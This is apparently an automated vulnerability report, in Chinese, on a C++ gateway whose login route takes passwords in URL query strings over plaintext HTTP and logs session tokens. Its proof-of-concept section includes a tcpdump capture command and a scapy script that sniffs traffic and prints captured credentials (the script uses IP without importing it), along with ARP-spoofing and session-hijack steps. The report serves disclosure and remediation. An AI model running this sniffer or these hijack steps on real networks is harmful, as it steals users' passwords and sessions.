# VULN-SEC-CPP-CONFIG-AUTH-005: 登录接口通过 URL 查询参数明文传输密码导致凭证泄露

**严重性**: High | **CWE**: CWE-598 (Use of GET Request Method With Sensitive Query Strings) | **置信度**: 85/100
**位置**: `src/main.cpp:41-43` @ `main::login_handler`
**语言/框架**: C++ / 自研 HTTP 服务器
**分析类型**: config
**Source/Sink**: url_query_parameter → credential_logging
**规则/证据来源**: c_cpp.config.credential_in_url / llm

---

## 1. 漏洞细节

登录端点 `POST /login` 通过 URL 查询字符串参数（`?user=X&password=Y`）接收用户密码，而非通过 HTTP 请求体（POST body）传输。这违反了 CWE-598 安全规范：敏感信息不应通过 URL 查询参数传递。

该漏洞存在三重泄露风险：

1. **传输层泄露**：HTTP 服务器使用原始 TCP 套接字实现（`http_server.cpp:82`），未配置任何 TLS/SSL 加密层。密码在网络中以明文传输，任何能够监听网络流量的攻击者都可以直接截获密码。

2. **日志层泄露**：URL 查询字符串会被多种基础设施组件记录，包括：
   - Web 服务器访问日志（请求行包含完整 URL 含查询参数）
   - 反向代理和负载均衡器日志
   - 浏览器历史记录
   - ISP 和网络中间设备的日志

3. **审计日志泄露**：`main.cpp:43` 调用 `audit.event(username, "login-attempt", request.body)` 将登录尝试写入审计日志文件 `edge-gateway.audit.log`。虽然此处记录的是 `request.body` 而非查询参数，但结合明文传输和 URL 日志暴露，密码已在多个位置可被获取。

此外，登录成功后返回的会话令牌（`main.cpp:51`）同样通过明文 HTTP 传输，使得攻击者可以截获令牌进行会话劫持。

### 证据摘要

- 触发源: URL 查询参数 `password`（`main.cpp:42`）
- 危险点: 凭证通过 URL 查询字符串传输，且无 TLS 加密
- 已检查的清洗/缓解: 无 TLS 配置（原始 TCP 套接字服务器）；审计日志无密码脱敏处理；查询字符串在服务器访问日志中可见
- 关键证据:
  - `http_server.cpp:82` 使用 `socket(AF_INET, SOCK_STREAM, 0)` 创建原始套接字，无 SSL/TLS 封装
  - `http_server.cpp:47-53` 从 HTTP 请求行解析查询字符串，密码作为 URL 的一部分被完整接收
  - `main.cpp:42` 通过 `queryValue(request, "password")` 从查询字符串提取密码
  - `audit_log.hpp:11-14` 审计日志以明文追加写入文件，无任何脱敏机制

## 2. 漏洞代码

**文件**: `src/main.cpp` (行 40-52)

```cpp
  server.route("POST", "/login", [&](const HttpRequest& request) {
    std::string username = queryValue(request, "user");       // 行41: 从URL查询参数提取用户名
    std::string password = queryValue(request, "password");   // 行42: 从URL查询参数提取密码 ← 漏洞点
    audit.event(username, "login-attempt", request.body);     // 行43: 审计日志记录登录尝试

    if (!users.authenticate(username, password)) {            // 行45: 使用密码进行认证
      return text(401, "invalid credentials\n");
    }

    std::string token = users.issueSession(username);
    audit.event(username, "login-success", token);            // 行50: 审计日志记录会话令牌
    return text(200, "session=" + token + "\n");              // 行51: 明文HTTP返回令牌
  });
```

**文件**: `src/http_server.cpp` (行 42-54) — 请求解析

```cpp
HttpRequest HttpServer::parseRequest(const std::string& raw) const {
  HttpRequest request;
  std::istringstream stream(raw);
  std::string target;

  stream >> request.method >> target;                         // 行47: 解析请求行，包含完整URL
  auto queryPos = target.find('?');
  if (queryPos == std::string::npos) {
    request.path = target;
  } else {
    request.path = target.substr(0, queryPos);
    request.query = parseQuery(target.substr(queryPos + 1));  // 行53: 解析查询字符串为键值对
  }
  // ...
}
```

**文件**: `src/http_server.cpp` (行 81-133) — 无 TLS 的原始套接字服务器

```cpp
int HttpServer::run() {
  int fd = ::socket(AF_INET, SOCK_STREAM, 0);                 // 行82: 原始TCP套接字，无TLS
  // ...
  for (;;) {
    int client = accept(fd, nullptr, nullptr);                // 行106: 接受明文TCP连接
    // ...
    ssize_t n = recv(client, buffer, sizeof(buffer) - 1, 0); // 行113: 接收明文HTTP数据
    // ...
    send(client, raw.data(), raw.size(), 0);                  // 行131: 发送明文HTTP响应
    close(client);
  }
}
```

**文件**: `include/audit_log.hpp` (行 11-15) — 审计日志无脱敏

```cpp
void event(const std::string& user, const std::string& action, const std::string& detail) {
    out_ << std::time(nullptr) << " user=" << user
         << " action=" << action
         << " detail=" << detail << "\n";                     // 明文写入，无脱敏处理
}
```

**代码分析**：

- **行 42** 是核心漏洞点：密码从 URL 查询参数中提取。这意味着客户端发送的请求格式为 `POST /login?user=admin&password=secret123 HTTP/1.1`，密码直接暴露在 HTTP 请求行中。
- **http_server.cpp:82** 确认服务器使用原始 TCP 套接字，整个代码库中没有任何 SSL/TLS 相关的引用或配置，所有网络通信均为明文。
- **audit_log.hpp:12-14** 审计日志以追加模式写入文件，`detail` 字段不做任何过滤或脱敏。虽然 `main.cpp:43` 传入的是 `request.body`，但 `main.cpp:50` 将会话令牌直接写入审计日志，令牌同样面临泄露风险。

## 3. 完整攻击链路

```
[网络攻击者] 监听网络流量（ARP欺骗/端口镜像/WiFi嗅探）
↓ 截获明文 HTTP 请求
[入口点] POST /login?user=X&password=Y — 明文 HTTP 请求
↓ http_server.cpp:113 recv() 接收明文数据
[请求解析] parseRequest()@http_server.cpp:42
↓ http_server.cpp:47-53 从请求行提取查询字符串
[查询解析] parseQuery()@http_server.cpp:19
↓ http_server.cpp:23-29 按 '&' 分割，按 '=' 提取键值对
[密码提取] queryValue(request, "password")@main.cpp:42
↓ 密码从 request.query map 中取出
[认证] users.authenticate(username, password)@main.cpp:45
↓ 认证成功
[令牌泄露] text(200, "session=" + token)@main.cpp:51
↓ 会话令牌通过明文 HTTP 返回
[网络攻击者] 截获会话令牌 → 会话劫持
```

**链路详细说明**：

1. **网络层**：攻击者在同一网络中通过 ARP 欺骗、端口镜像或 WiFi 嗅探等方式监听流量。由于服务器使用原始 TCP 套接字（`http_server.cpp:82`），所有 HTTP 数据以明文传输。

2. **请求接收**：`recv()` 在 `http_server.cpp:113` 接收客户端发送的原始 HTTP 请求字节流，包含完整的请求行 `POST /login?user=admin&password=secret HTTP/1.1`。

3. **请求解析**：`parseRequest()` 在 `http_server.cpp:42` 解析请求行，通过 `stream >> request.method >> target` 提取目标 URL（含查询字符串）。

4. **查询字符串解析**：`parseQuery()` 在 `http_server.cpp:19` 将查询字符串按 `&` 分割，再按 `=` 提取键值对，密码被存入 `request.query["password"]`。

5. **密码使用**：`main.cpp:42` 通过 `queryValue()` 从 `request.query` 中取出密码值，传递给认证函数。

6. **令牌返回**：认证成功后，`main.cpp:51` 将会话令牌拼接到响应体中，通过明文 HTTP 返回给客户端。攻击者同样可以截获此令牌。

## 4. 攻击场景

**攻击者画像**: 网络中间人（Man-in-the-Middle），可以是同一局域网内的恶意用户、被入侵的网络设备、或能够监听网络流量的任何攻击者。无需任何认证或特殊权限。

**攻击向量**: 网络流量嗅探。攻击者通过 ARP 欺骗、DNS 劫持、WiFi 嗅探或 compromised 网络设备截获明文 HTTP 流量。

**利用难度**: 低

### 攻击步骤

1. **流量监听**：攻击者在目标服务器所在网络中使用 Wireshark、tcpdump 等工具监听网络流量。
2. **等待登录请求**：等待用户向服务器发送 `POST /login` 请求。
3. **截获密码**：从截获的 HTTP 请求中提取 URL 查询参数 `password` 的值。
4. **截获会话令牌**：从 HTTP 响应中提取 `session=` 后的令牌值。
5. **会话劫持**：使用截获的会话令牌冒充合法用户访问系统。
6. **日志挖掘**（备选路径）：如果攻击者能够访问服务器文件系统或代理服务器日志，可直接从日志文件中提取密码。

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                                   |
| ---------- | -------------- | -------------------------------------------------------------------------------------- |
| 网络可达性 | 同一网络或中间人位置 | 攻击者需要能够监听服务器与客户端之间的网络流量，可通过 ARP 欺骗、WiFi 嗅探等方式实现 |
| 认证要求   | 无需认证       | 攻击者仅需监听网络流量，无需任何系统凭证                                               |
| 配置依赖   | 无 TLS（默认配置） | 服务器默认且唯一运行模式即为明文 HTTP，无需特殊配置触发                                |
| 环境依赖   | 无特殊要求     | 任何能够进行网络嗅探的环境均可利用                                                     |
| 时序条件   | 用户发起登录   | 需要等待合法用户发起登录请求，但登录是常规操作，触发概率高                             |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                             |
| -------- | ---- | ------------------------------------------------------------------------------------------------ |
| 机密性   | 高   | 用户密码在传输过程中以明文暴露，可被网络监听截获。密码还可能泄露到多种日志系统中。             |
| 完整性   | 高   | 攻击者截获密码后可完全冒充合法用户，获得用户的全部操作权限，包括数据修改能力。                   |
| 可用性   | 中   | 攻击者可通过截获的凭证进行恶意操作，可能导致服务被滥用或合法用户被锁定。                         |

**影响范围**: 全局影响。所有使用该登录接口的用户密码均面临泄露风险。攻击者一旦获取密码，可完全接管用户账户。如果管理员账户使用该接口登录，攻击者可获得系统完全控制权。会话令牌的明文传输进一步加剧了风险，使攻击者无需密码即可劫持活跃会话。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 1: 网络流量嗅探截获密码

```bash
# 在服务器上启动服务
./edge-gateway 8080

# 在攻击者机器上使用 tcpdump 监听登录流量
sudo tcpdump -i eth0 -A 'tcp port 8080 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

# 在客户端模拟登录请求（密码通过URL查询参数传输）
curl -X POST "http://target-server:8080/login?user=admin&password=SuperSecret123"

# tcpdump 输出将显示:
# POST /login?user=admin&password=SuperSecret123 HTTP/1.1
# 密码 SuperSecret123 以明文形式可见
```

### PoC 2: 使用 Python 脚本自动截获和提取凭证

```python
#!/usr/bin/env python3
"""仅供安全测试使用 - 从网络流量中提取 URL 查询参数中的凭证"""
from scapy.all import sniff, TCP, Raw
import re

def extract_credentials(packet):
    if packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', errors='ignore')
        # 匹配 POST /login 请求中的查询参数
        match = re.search(r'POST /login\?user=([^&]+)&password=([^\s]+)', payload)
        if match:
            username = match.group(1)
            password = match.group(2)
            print(f"[!] 截获凭证 - 用户: {username}, 密码: {password}")
            print(f"    来源: {packet[IP].src} -> {packet[IP].dst}")

sniff(filter="tcp port 8080", prn=extract_credentials, store=0)
```

### PoC 3: 审计日志中的信息泄露验证

```bash
# 发送登录请求
curl -X POST "http://localhost:8080/login?user=admin&password=test123"

# 查看审计日志
cat edge-gateway.audit.log

# 预期输出（注意 detail 字段可能包含请求体内容）:
# 1718700000 user=admin action=login-attempt detail=...
# 1718700000 user=admin action=login-success detail=<session_token>
# 会话令牌以明文记录在审计日志中
```

**使用说明**: PoC 1 演示了最基本的攻击方式——使用 tcpdump 直接截获明文密码。PoC 2 提供了自动化工具，可从网络流量中批量提取凭证。PoC 3 验证审计日志中的信息泄露。

**预期结果**: tcpdump 或 Wireshark 将直接显示 HTTP 请求行中的明文密码。攻击者无需任何解密操作即可读取密码。审计日志文件中将包含会话令牌的明文记录。

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux (Ubuntu 20.04+ 或任意支持 C++17 编译的 Linux 发行版)
- 编译器: g++ 9.0+ 或 clang++ 10+ (支持 C++17)
- 依赖: 无外部依赖库，项目使用标准库和 POSIX 套接字 API
- 工具: curl, tcpdump 或 Wireshark（用于流量嗅探验证）

### 构建步骤

```bash
# 编译项目
cd /scan/project
g++ -std=c++17 -o edge-gateway src/main.cpp src/http_server.cpp src/user_store.cpp src/file_cache.cpp src/diagnostics.cpp -I include

# 或使用项目的构建系统（如有 CMakeLists.txt）
mkdir build && cd build
cmake .. && make
```

### 运行配置

```bash
# 启动服务器（默认监听 8080 端口）
./edge-gateway 8080

# 服务器将在控制台输出:
# edge-gateway listening on port 8080
```

### 验证步骤

1. 启动服务器: `./edge-gateway 8080`
2. 在另一终端启动流量监听: `sudo tcpdump -i lo -A 'tcp port 8080'`
3. 发送登录请求: `curl -X POST "http://localhost:8080/login?user=admin&password=MySecretPassword"`
4. 观察 tcpdump 输出，确认密码以明文形式出现在 HTTP 请求行中
5. 检查审计日志: `cat edge-gateway.audit.log`，确认登录信息和会话令牌被明文记录

### 预期结果

- **tcpdump 输出**中将清晰显示 `POST /login?user=admin&password=MySecretPassword HTTP/1.1`，密码完全可读
- **HTTP 响应**中将显示 `session=<token>`，会话令牌同样以明文传输
- **审计日志**中将包含登录尝试记录和会话令牌的明文记录
- 整个过程中没有任何加密层保护，所有敏感信息均可被网络监听者直接获取
